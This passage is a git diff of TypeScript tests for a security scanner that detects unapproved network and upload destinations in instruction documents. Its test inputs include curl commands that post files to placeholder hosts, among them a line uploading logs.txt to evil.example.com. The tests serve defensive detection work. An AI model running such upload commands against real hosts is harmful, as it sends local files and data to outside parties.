@@ -6,7 +6,12 @@ import test from "node:test";
 
 import { scan } from "../src/scanner.js";
 import { parseDocument } from "../src/markdown.js";
-import { securityDiagnosticFindings } from "../src/security-diagnostics.js";
+import {
+  associatedNetworkDestinations,
+  associatedUploadDestinations,
+  classifyDestinationCandidates,
+  securityDiagnosticFindings,
+} from "../src/security-diagnostics.js";
 import type { Artifact, Finding } from "../src/types.js";
 import { canonicalSkillFixture } from "./canonical-skill-fixture.js";
 
@@ -2236,6 +2241,479 @@ POST https://internal.example.com/api/upload with the report.
   assert.equal(ids.includes("SEC-UNAPPROVED-NETWORK-DESTINATION"), false);
 });
 
+test("destination candidates extract complete explicit URLs before bare tokens", () => {
+  const cases = [
+    {
+      url: "https://api.example.com/path",
+      kind: "explicit-url",
+      host: "api.example.com",
+      path: "/path",
+    },
+    {
+      url: "https://user@example.com/path",
+      kind: "explicit-url",
+      host: "example.com",
+      path: "/path",
+    },
+    {
+      url: "https://user:pass@example.com/path",
+      kind: "explicit-url",
+      host: "example.com",
+      path: "/path",
+    },
+    {
+      url: "http://internal-host/path",
+      kind: "explicit-url",
+      host: "internal-host",
+      path: "/path",
+    },
+    {
+      url: "https://例え.テスト/path",
+      kind: "explicit-url",
+      host: "xn--r8jz45g.xn--zckzah",
+      path: "/path",
+    },
+    {
+      url: "//example.com/path",
+      kind: "explicit-url",
+      host: "example.com",
+      path: "/path",
+    },
+    {
+      url: "//[2001:db8::20]/path",
+      kind: "explicit-url",
+      host: "2001:db8::20",
+      path: "/path",
+    },
+    {
+      url: "http://[2001:0db8:0:0:0:0:0:20]/data",
+      kind: "explicit-url",
+      host: "2001:db8::20",
+      path: "/data",
+    },
+    {
+      url: "http://localhost/health",
+      kind: "explicit-url",
+      host: "localhost",
+      path: "/health",
+    },
+    {
+      url: "http://10.0.0.20/data",
+      kind: "explicit-url",
+      host: "10.0.0.20",
+      path: "/data",
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const line = `Fetch ${expected.url} now.`;
+    const candidates = classifyDestinationCandidates(line).filter(
+      (candidate) => candidate.destination !== undefined,
+    );
+    assert.equal(candidates.length, 1, line);
+    assert.equal(candidates[0]?.raw, expected.url, line);
+    assert.equal(candidates[0]?.kind, expected.kind, line);
+    assert.equal(candidates[0]?.destination?.host, expected.host, line);
+    assert.equal(candidates[0]?.destination?.path, expected.path, line);
+  }
+});
+
+test("explicit URL hosts drive end-to-end allowlist matching", () => {
+  const cases = [
+    {
+      instruction: "Fetch https://user:pass@example.com/path.",
+      allowlist: "https://example.com",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch https://user:pass@example.com/path.",
+      allowlist: "https://other.example.com",
+      findings: 1,
+    },
+    {
+      instruction: "Fetch https://例え.テスト/path.",
+      allowlist: "https://xn--r8jz45g.xn--zckzah",
+      findings: 0,
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: "${expected.allowlist}"
+---
+
+${expected.instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION");
+    assert.equal(findings.length, expected.findings, expected.instruction);
+  }
+});
+
+test("destination candidates classify unambiguous bare targets and network shares", () => {
+  const cases = [
+    {
+      line: "Fetch api.example.com:8443/path.",
+      kind: "bare-host",
+      host: "api.example.com",
+      path: "/path",
+    },
+    {
+      line: String.raw`Fetch \\files.example.com\release.`,
+      kind: "network-share",
+      host: "files.example.com",
+      path: "/release",
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const candidates = classifyDestinationCandidates(expected.line).filter(
+      (candidate) => candidate.destination !== undefined,
+    );
+    assert.equal(candidates.length, 1, expected.line);
+    assert.equal(candidates[0]?.kind, expected.kind, expected.line);
+    assert.equal(
+      candidates[0]?.destination?.host,
+      expected.host,
+      expected.line,
+    );
+    assert.equal(
+      candidates[0]?.destination?.path,
+      expected.path,
+      expected.line,
+    );
+  }
+});
+
+test("local and ambiguous dotted candidates require operational association", () => {
+  const cases = [
+    [".github/workflows/npm-publish.yml", "local-path"],
+    ["tools/release-prep.mjs", "local-path"],
+    ["./package.json", "local-path"],
+    ["../package.json", "local-path"],
+    ["dir/package.json", "local-path"],
+    [String.raw`C:\dir\package.json`, "local-path"],
+    ["Publish package.json.", "local-filename"],
+    ["Fetch README.md.", "ambiguous-dotted-token"],
+    ["Publish main.rs.", "ambiguous-dotted-token"],
+    ["Run deploy.sh.", "ambiguous-dotted-token"],
+    ["Fetch renma.config.json.", "local-filename"],
+    ["Validate npm-publish.yml.", "local-filename"],
+    ["Copy report.tar.gz.", "local-filename"],
+    ["Use context.release.prep.", "renma-asset-id"],
+    ["Use lens.testing.spec-review.", "renma-asset-id"],
+    ["Read .env.example.", "local-filename"],
+    ["Submit coverage.xml for local processing.", "local-filename"],
+    ["run --config=renma.config.json", "command-file-argument"],
+    ["curl --data @payload.json", "command-file-argument"],
+    ["Publish `package.json` after validation.", "local-filename"],
+    [
+      "The local filename report.tar.gz remains in the workspace.",
+      "local-filename",
+    ],
+  ] as const;
+
+  for (const [line, kind] of cases) {
+    const candidates = classifyDestinationCandidates(line);
+    assert.ok(candidates.length > 0, line);
+    assert.ok(
+      candidates.some((candidate) => candidate.kind === kind),
+      `${line}: ${kind}`,
+    );
+    assert.deepEqual(associatedNetworkDestinations(line), [], line);
+    assert.deepEqual(associatedUploadDestinations(line), [], line);
+  }
+});
+
+test("ambiguous bare hosts promote only through deterministic target syntax", () => {
+  const cases = [
+    ["GET api.example.com", true, false],
+    ["POST api.example.com", true, true],
+    ["PUT uploads.example.com", true, true],
+    ["curl api.example.com", true, false],
+    ["wget api.example.com", true, false],
+    ["Fetch from api.example.com", true, false],
+    ["Download from api.example.com", true, false],
+    ["Upload to uploads.example.com", true, true],
+    ["Send to uploads.example.com", true, true],
+    ["Share with uploads.example.com", true, true],
+    ["Attach the report to uploads.example.com", true, true],
+    ["Submit the report to uploads.example.com", true, true],
+    ["Sync with uploads.example.com", true, true],
+    ["Push to uploads.example.com", true, true],
+    ["Publish the artifact to uploads.example.com", true, true],
+    ["Copy the report to uploads.example.com", true, true],
+    ["Attach logs and reports to uploads.example.com", true, true],
+    ["Fetch README.md", false, false],
+    ["Publish main.rs", false, false],
+    ["Run deploy.sh", false, false],
+  ] as const;
+
+  for (const [line, network, upload] of cases) {
+    assert.equal(
+      associatedNetworkDestinations(line).length === 1,
+      network,
+      line,
+    );
+    assert.equal(associatedUploadDestinations(line).length === 1, upload, line);
+  }
+});
+
+test("transport-less IP and host-shaped tokens require an operational action", () => {
+  const cases = [
+    ["Document 192.0.2.20 as an example address.", [], []],
+    ["Record api.example.com:8443/path as sample data.", [], []],
+    ["Use version 1.2.3.4 in the compatibility example.", [], []],
+    ["Fetch 192.0.2.20.", ["192.0.2.20"], []],
+    ["GET api.example.com:8443/path.", ["api.example.com"], []],
+    ["Fetch api.example.com:8443/path.", ["api.example.com"], []],
+    ["Upload to 192.0.2.20.", ["192.0.2.20"], ["192.0.2.20"]],
+  ] as const;
+
+  for (const [line, network, upload] of cases) {
+    assert.deepEqual(
+      associatedNetworkDestinations(line).map(
+        (destination) => destination.host,
+      ),
+      network,
+      line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(line).map((destination) => destination.host),
+      upload,
+      line,
+    );
+  }
+});
+
+test("transport-less example prose does not produce allowlist findings", () => {
+  const findings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: approved.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+Document 192.0.2.20 as an example address.
+Record api.example.com:8443/path as sample data.
+Use version 1.2.3.4 in the compatibility example.
+`),
+  ]).filter(
+    (finding) =>
+      finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION" ||
+      finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+  );
+
+  assert.deepEqual(findings, []);
+
+  const deniedFindings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+---
+
+Document 192.0.2.20 as an example address.
+Record api.example.com:8443/path as sample data.
+Use version 1.2.3.4 in the compatibility example.
+`),
+  ]).filter((finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY");
+  assert.deepEqual(deniedFindings, []);
+});
+
+test("destination classification is deterministic under repeated and reversed input order", () => {
+  const forward =
+    "Fetch from api.example.com, then upload results to uploads.example.com.";
+  const reverse =
+    "Upload results to uploads.example.com, then fetch from api.example.com.";
+
+  for (const [line, expectedNetwork] of [
+    [forward, ["api.example.com", "uploads.example.com"]],
+    [reverse, ["uploads.example.com", "api.example.com"]],
+    [forward, ["api.example.com", "uploads.example.com"]],
+  ] as const) {
+    assert.deepEqual(
+      classifyDestinationCandidates(line)
+        .filter((candidate) => candidate.destination !== undefined)
+        .map((candidate) => candidate.destination?.host),
+      expectedNetwork,
+    );
+    assert.deepEqual(
+      associatedNetworkDestinations(line).map(
+        (destination) => destination.host,
+      ),
+      expectedNetwork,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(line).map((destination) => destination.host),
+      ["uploads.example.com"],
+    );
+  }
+});
+
+test("one action deterministically governs coordinated destination lists", () => {
+  const cases = [
+    {
+      line: "Fetch from source.example.com and mirror.example.com.",
+      network: ["source.example.com", "mirror.example.com"],
+      upload: [],
+    },
+    {
+      line: "Fetch from source.example.com, mirror.example.com, and fallback.example.com.",
+      network: [
+        "source.example.com",
+        "mirror.example.com",
+        "fallback.example.com",
+      ],
+      upload: [],
+    },
+    {
+      line: "Upload to sink1.example.com and sink2.example.com.",
+      network: ["sink1.example.com", "sink2.example.com"],
+      upload: ["sink1.example.com", "sink2.example.com"],
+    },
+    {
+      line: "Upload to sink1.example.com, sink2.example.com, and sink3.example.com.",
+      network: ["sink1.example.com", "sink2.example.com", "sink3.example.com"],
+      upload: ["sink1.example.com", "sink2.example.com", "sink3.example.com"],
+    },
+    {
+      line: "Share with sink1.example.com and sink2.example.com.",
+      network: ["sink1.example.com", "sink2.example.com"],
+      upload: ["sink1.example.com", "sink2.example.com"],
+    },
+    {
+      line: "Fetch from source.example.com and upload to sink.example.com.",
+      network: ["source.example.com", "sink.example.com"],
+      upload: ["sink.example.com"],
+    },
+    {
+      line: "Fetch from https://source.example.com. And mirror.example.com.",
+      network: ["source.example.com"],
+      upload: [],
+    },
+    {
+      line: "Fetch from fallback.example.com, mirror.example.com, and source.example.com.",
+      network: [
+        "fallback.example.com",
+        "mirror.example.com",
+        "source.example.com",
+      ],
+      upload: [],
+    },
+    {
+      line: "Upload to sink1.example.com and sink1.example.com.",
+      network: ["sink1.example.com"],
+      upload: ["sink1.example.com"],
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.network,
+      expected.line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.upload,
+      expected.line,
+    );
+  }
+});
+
+test("coordinated destination lists check every unique allowlist member", () => {
+  const cases = [
+    {
+      line: "Fetch from source.example.com and mirror.example.com.",
+      networkAllowlist: "source.example.com",
+      uploadAllowlist: "approved.example.com",
+      networkFindings: 1,
+      uploadFindings: 0,
+    },
+    {
+      line: "Fetch from source.example.com, mirror.example.com, and fallback.example.com.",
+      networkAllowlist:
+        "source.example.com, mirror.example.com, fallback.example.com",
+      uploadAllowlist: "approved.example.com",
+      networkFindings: 0,
+      uploadFindings: 0,
+    },
+    {
+      line: "Upload to sink1.example.com and sink2.example.com.",
+      networkAllowlist: "sink1.example.com, sink2.example.com",
+      uploadAllowlist: "sink1.example.com",
+      networkFindings: 0,
+      uploadFindings: 1,
+    },
+    {
+      line: "Upload to sink1.example.com, sink2.example.com, and sink3.example.com.",
+      networkAllowlist:
+        "sink1.example.com, sink2.example.com, sink3.example.com",
+      uploadAllowlist: "sink1.example.com, sink3.example.com",
+      networkFindings: 0,
+      uploadFindings: 1,
+    },
+    {
+      line: "Fetch from source.example.com and upload to sink.example.com.",
+      networkAllowlist: "approved.example.com",
+      uploadAllowlist: "approved.example.com",
+      networkFindings: 2,
+      uploadFindings: 1,
+    },
+    {
+      line: "Fetch from mirror.example.com and source.example.com.",
+      networkAllowlist: "source.example.com",
+      uploadAllowlist: "approved.example.com",
+      networkFindings: 1,
+      uploadFindings: 0,
+    },
+    {
+      line: "Upload to sink1.example.com and sink1.example.com.",
+      networkAllowlist: "approved.example.com",
+      uploadAllowlist: "approved.example.com",
+      networkFindings: 1,
+      uploadFindings: 1,
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${expected.networkAllowlist}
+external_upload_allowed: true
+approved_upload_destinations: ${expected.uploadAllowlist}
+---
+
+${expected.line}
+`),
+    ]);
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ).length,
+      expected.networkFindings,
+      expected.line,
+    );
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      expected.uploadFindings,
+      expected.line,
+    );
+  }
+});
+
 test("network allowlists ignore dotted asset IDs and local script paths", () => {
   const findings = securityDiagnosticFindings([
     v2SecurityArtifact(`---
@@ -2300,6 +2778,48 @@ POST https://internal.example.com/other/upload.
       finding.evidence.snippet.includes("internal.example.com/other"),
     ),
   );
+});
+
+test("network destination matching preserves ports, subdomains, and path prefixes", () => {
+  const cases = [
+    {
+      instruction: "Fetch api.example.com:8443/releases/latest.",
+      allowlist: "example.com",
+      approved: true,
+    },
+    {
+      instruction: "Fetch https://internal.example.com/api/releases/latest.",
+      allowlist: "https://internal.example.com/api",
+      approved: true,
+    },
+    {
+      instruction: "Fetch https://api.example.com/api/releases/latest.",
+      allowlist: "https://example.com/api",
+      approved: false,
+    },
+    {
+      instruction: "Fetch https://internal.example.com/other.",
+      allowlist: "https://internal.example.com/api",
+      approved: false,
+    },
+  ] as const;
+
+  for (const { instruction, allowlist, approved } of [
+    ...cases,
+    ...cases.toReversed(),
+  ]) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${allowlist}
+---
+
+${instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION");
+    assert.equal(findings.length, approved ? 0 : 1, instruction);
+  }
 });
 
 test("unapproved network destination guidance preserves semantic allowlists", () => {
@@ -2776,6 +3296,868 @@ curl --data-binary @logs.txt https://evil.example.com/upload
   assert.match(uploadFindings[0]?.evidence.snippet ?? "", /evil\.example\.com/);
 });
 
+test("curl upload association is independent of option order", () => {
+  const instructions = [
+    "curl --data @payload.json https://sink.example.com",
+    "curl https://sink.example.com --data @payload.json",
+    "curl --data-binary @payload.json https://sink.example.com",
+    "curl https://sink.example.com --data-binary @payload.json",
+    "curl -X POST https://sink.example.com",
+    "curl https://sink.example.com -X POST",
+    "curl -X PUT https://sink.example.com",
+    "curl https://sink.example.com -X PUT",
+    "curl -d @payload.json https://sink.example.com",
+    "curl https://sink.example.com -d @payload.json",
+    "curl -F file=@payload.json https://sink.example.com",
+    "curl https://sink.example.com --form file=@payload.json",
+    "curl -T payload.json https://sink.example.com",
+    "curl https://sink.example.com --upload-file payload.json",
+  ];
+
+  for (const instruction of instructions) {
+    assert.deepEqual(
+      associatedNetworkDestinations(instruction).map(
+        (destination) => destination.host,
+      ),
+      ["sink.example.com"],
+      instruction,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(instruction).map(
+        (destination) => destination.host,
+      ),
+      ["sink.example.com"],
+      instruction,
+    );
+  }
+
+  const multipleDestinations =
+    "curl https://source.example.com https://sink.example.com --data @payload.json";
+  assert.deepEqual(
+    associatedNetworkDestinations(multipleDestinations).map(
+      (destination) => destination.host,
+    ),
+    ["source.example.com", "sink.example.com"],
+  );
+  assert.deepEqual(
+    associatedUploadDestinations(multipleDestinations).map(
+      (destination) => destination.host,
+    ),
+    ["source.example.com", "sink.example.com"],
+  );
+
+  assert.deepEqual(
+    associatedUploadDestinations("curl https://sink.example.com/releases"),
+    [],
+  );
+  assert.deepEqual(
+    associatedUploadDestinations(
+      "curl https://sink.example.com. Explain --data as a later example.",
+    ),
+    [],
+  );
+
+  const commandArguments = classifyDestinationCandidates(
+    "curl https://sink.example.com --data @payload.json",
+  );
+  assert.ok(
+    commandArguments.some(
+      (candidate) => candidate.kind === "command-file-argument",
+    ),
+  );
+});
+
+const CURL_BOUNDARY_CASES = [
+  {
+    line: "curl https://read.example.com && curl --data @payload.json https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl https://read.example.com || curl -X POST https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl -X POST https://write.example.com && curl https://read.example.com",
+    network: ["write.example.com", "read.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl https://read.example.com | grep --data",
+    network: ["read.example.com"],
+    upload: [],
+  },
+  {
+    line: "curl https://read.example.com & curl --data @payload.json https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl https://read.example.com ; curl --upload-file payload.json https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl https://read.example.com --next --data @payload.json https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl --data @payload.json https://write.example.com --next https://read.example.com",
+    network: ["write.example.com", "read.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl -X PUT https://write.example.com --next https://read.example.com",
+    network: ["write.example.com", "read.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: "curl https://one.example.com https://two.example.com --data @payload.json",
+    network: ["one.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: 'curl https://one.example.com --data "value=left|right&&still --next" https://two.example.com',
+    network: ["one.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: 'curl "https://one.example.com/upload?value=left|right&&next=1" --data @payload.json',
+    network: ["one.example.com"],
+    upload: ["one.example.com"],
+  },
+  {
+    line: String.raw`curl https://one.example.com \| --data @payload.json https://two.example.com`,
+    network: ["one.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: "curl https://read.example.com && curl --data @payload.json https://write.example.com https://write.example.com",
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+] as const;
+
+test("curl upload association stays within shell commands and transfers", () => {
+  for (const expected of CURL_BOUNDARY_CASES) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.network,
+      expected.line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.upload,
+      expected.line,
+    );
+  }
+});
+
+test("curl command and transfer boundaries preserve separate allowlists", () => {
+  const findingsFor = (
+    instruction: string,
+    networkAllowlist: readonly string[],
+    uploadAllowlist: readonly string[],
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${networkAllowlist.join(", ")}
+external_upload_allowed: true
+approved_upload_destinations: ${
+        uploadAllowlist.length > 0
+          ? uploadAllowlist.join(", ")
+          : "approved.example.com"
+      }
+---
+
+${instruction}
+`),
+    ]);
+
+  for (const expected of CURL_BOUNDARY_CASES) {
+    const approved = findingsFor(
+      expected.line,
+      expected.network,
+      expected.upload,
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+
+    const unapprovedUpload = findingsFor(expected.line, expected.network, [
+      "approved.example.com",
+    ]);
+    assert.equal(
+      unapprovedUpload.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      expected.upload.length,
+      expected.line,
+    );
+  }
+});
+
+const MULTILINE_CURL_UPLOAD_OPTIONS = [
+  "-d @payload.json",
+  "--data @payload.json",
+  "--data-binary @payload.json",
+  "-F file=@payload.json",
+  "--form file=@payload.json",
+  "-T payload.json",
+  "--upload-file payload.json",
+  "-X POST",
+  "-X PUT",
+] as const;
+
+function continuedShell(...lines: string[]): string {
+  return lines.join(" " + "\\" + "\n  ");
+}
+
+function continuedToken(...parts: string[]): string {
+  return parts.join("\\\n");
+}
+
+const TOKEN_CONTINUED_CURL_CASES = [
+  {
+    name: "split upload option",
+    instruction: continuedToken(
+      "curl --data-bin",
+      "ary @payload.json https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split POST method",
+    instruction: continuedToken(
+      "curl -X PO",
+      "ST https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split PUT method",
+    instruction: continuedToken(
+      "curl -X P",
+      "UT https://sink.example.com/upload",
+    ),
+  },
+  {
+    name: "split hostname",
+    instruction: continuedToken(
+      "curl https://sink.exam",
+      "ple.com/upload --data @payload.json",
+    ),
+  },
+  {
+    name: "split quoted hostname",
+    instruction: continuedToken(
+      'curl "https://sink.exam',
+      'ple.com/upload" --data @payload.json',
+    ),
+  },
+  {
+    name: "split path",
+    instruction: continuedToken(
+      "curl https://sink.example.com/uploa",
+      "d --data @payload.json",
+    ),
+  },
+  {
+    name: "separated tokens",
+    instruction: continuedShell(
+      "curl https://sink.example.com/upload",
+      "--data @payload.json",
+    ),
+  },
+] as const;
+
+test("token-continued curl syntax preserves pure destination association", () => {
+  for (const expected of TOKEN_CONTINUED_CURL_CASES) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.instruction).map((destination) => [
+        destination.host,
+        destination.path,
+      ]),
+      [["sink.example.com", "/upload"]],
+      expected.name,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.instruction).map((destination) => [
+        destination.host,
+        destination.path,
+      ]),
+      [["sink.example.com", "/upload"]],
+      expected.name,
+    );
+  }
+});
+
+test("backslash-continued curl options associate in either order", () => {
+  const destination = "https://sink.example.com/upload";
+
+  for (const option of MULTILINE_CURL_UPLOAD_OPTIONS) {
+    for (const instruction of [
+      continuedShell(`curl ${destination}`, option),
+      continuedShell(`curl ${option}`, destination),
+    ]) {
+      assert.deepEqual(
+        associatedNetworkDestinations(instruction).map(
+          (candidate) => candidate.host,
+        ),
+        ["sink.example.com"],
+        instruction,
+      );
+      assert.deepEqual(
+        associatedUploadDestinations(instruction).map(
+          (candidate) => candidate.host,
+        ),
+        ["sink.example.com"],
+        instruction,
+      );
+    }
+  }
+});
+
+const MULTILINE_CURL_BOUNDARY_CASES = [
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "&& curl --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "|| curl -X POST",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell("curl https://read.example.com", "| grep --data"),
+    network: ["read.example.com"],
+    upload: [],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "; curl --upload-file payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "& curl --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "--next --data @payload.json",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://one.example.com",
+      "https://two.example.com",
+      "--data @payload.json",
+    ),
+    network: ["one.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl --data @payload.json https://one.example.com",
+      "--next https://read.example.com",
+      "--next -X PUT https://two.example.com",
+    ),
+    network: ["one.example.com", "read.example.com", "two.example.com"],
+    upload: ["one.example.com", "two.example.com"],
+  },
+  {
+    line: continuedShell(
+      "curl https://read.example.com",
+      "& curl --data @payload.json https://write.example.com",
+      "https://write.example.com",
+    ),
+    network: ["read.example.com", "write.example.com"],
+    upload: ["write.example.com"],
+  },
+] as const;
+
+test("logical curl commands apply command and transfer boundaries in order", () => {
+  for (const expected of MULTILINE_CURL_BOUNDARY_CASES) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.network,
+      expected.line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.upload,
+      expected.line,
+    );
+  }
+});
+
+const MULTILINE_CURL_NON_BOUNDARY_CASES = [
+  continuedShell(
+    "curl https://sink.example.com/upload &> output.log",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    "curl https://sink.example.com/upload 2>&1",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \&`,
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "&"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    "curl https://sink.example.com/upload 'a&b'",
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "--next"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \--next`,
+    "--data @payload.json",
+  ),
+  continuedShell(
+    'curl https://sink.example.com/upload "|"',
+    "--data @payload.json",
+  ),
+  continuedShell(
+    String.raw`curl https://sink.example.com/upload \|`,
+    "--data @payload.json",
+  ),
+] as const;
+
+test("ampersand redirections and quoted or escaped tokens are not boundaries", () => {
+  for (const instruction of MULTILINE_CURL_NON_BOUNDARY_CASES) {
+    assert.deepEqual(
+      associatedUploadDestinations(instruction).map(
+        (destination) => destination.host,
+      ),
+      ["sink.example.com"],
+      instruction,
+    );
+  }
+});
+
+test("multiline curl findings use complete bounded logical-command evidence", () => {
+  const findingsFor = (
+    instruction: string,
+    networkAllowlist = "approved.example.com",
+    uploadAllowlist = "approved.example.com",
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${networkAllowlist}
+external_upload_allowed: true
+approved_upload_destinations: ${uploadAllowlist}
+requires_human_approval: true
+---
+
+## Commands
+
+\`\`\`bash
+${instruction}
+\`\`\`
+
+Unrelated prose must stay outside the evidence.
+`),
+    ]);
+
+  for (const option of MULTILINE_CURL_UPLOAD_OPTIONS) {
+    for (const instruction of [
+      continuedShell("curl https://sink.example.com/upload", option),
+      continuedShell(`curl ${option}`, "https://sink.example.com/upload"),
+    ]) {
+      const findings = findingsFor(instruction);
+      for (const id of [
+        "SEC-UNAPPROVED-NETWORK-DESTINATION",
+        "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+        "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+        "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+      ]) {
+        const matching = findings.filter((finding) => finding.id === id);
+        assert.equal(matching.length, 1, `${id}: ${instruction}`);
+        const evidence = matching[0]?.evidence;
+        assert.ok(evidence);
+        assert.equal(evidence.endLine, evidence.startLine + 1, instruction);
+        assert.match(evidence.snippet, /curl/);
+        assert.match(evidence.snippet, /sink\.example\.com/);
+        assert.doesNotMatch(evidence.snippet, /Unrelated prose/);
+      }
+    }
+  }
+
+  for (const expected of MULTILINE_CURL_BOUNDARY_CASES) {
+    const approved = findingsFor(
+      expected.line,
+      expected.network.join(", "),
+      expected.upload.length > 0
+        ? expected.upload.join(", ")
+        : "approved.example.com",
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+    assert.equal(
+      approved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      0,
+      expected.line,
+    );
+    const uploadAdvisories = approved.filter(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    );
+    assert.equal(uploadAdvisories.length, expected.upload.length > 0 ? 1 : 0);
+    if (expected.upload.length > 0) {
+      const evidence = uploadAdvisories[0]?.evidence;
+      assert.ok(evidence);
+      assert.equal(
+        evidence.endLine - evidence.startLine + 1,
+        expected.line.split("\n").length,
+        expected.line,
+      );
+      assert.equal(evidence.snippet, expected.line, expected.line);
+    }
+
+    const unapproved = findingsFor(expected.line, expected.network.join(", "));
+    assert.equal(
+      unapproved.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      expected.upload.length,
+      expected.line,
+    );
+  }
+
+  for (const instruction of MULTILINE_CURL_NON_BOUNDARY_CASES) {
+    const findings = findingsFor(instruction, "sink.example.com");
+    assert.equal(
